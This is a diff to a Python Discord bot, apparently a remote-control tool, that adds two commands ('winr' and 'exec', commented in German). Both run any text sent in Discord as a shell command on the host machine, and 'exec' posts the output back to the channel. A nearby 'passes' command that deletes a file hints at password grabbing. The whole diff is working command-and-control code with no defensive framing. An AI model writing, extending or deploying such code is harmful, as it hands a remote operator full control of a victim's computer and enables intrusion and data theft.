@@ -1959,4 +1959,30 @@ async def passes(ctx):
         if os.path.exists(file_path):
             os.remove(file_path)
 
+@bot.command(help= "run anything like in win+r")
+async def winr(ctx, *, command):
+    try:
+        # Führe den Befehl aus, als wäre er im Win+R-Dialog eingegeben
+        subprocess.run(command, shell=True)
+        await ctx.send(f'Befehl ausgeführt: {command}')
+    except Exception as e:
+        await ctx.send(f'Fehler beim Ausführen des Befehls: {e}')
+
+
+@bot.command(help="Execute a command in the current directory")
+async def exec(ctx, *, command):
+    global current_directory
+    try:
+        # Führe den Befehl im aktuellen Verzeichnis aus
+        result = subprocess.run(command, cwd=current_directory, shell=True, capture_output=True, text=True)
+        output = result.stdout + result.stderr
+        if len(output) == 0:
+            await ctx.send("No output.")
+        else:
+            # Teile die Ausgabe in kleinere Teile auf
+            for i in range(0, len(output), 1900):
+                await ctx.send(f'```\n{output[i:i+1900]}\n```')
+    except Exception as e:
+        await ctx.send(f'Error: {e}')
+
 bot.run(TOKEN)
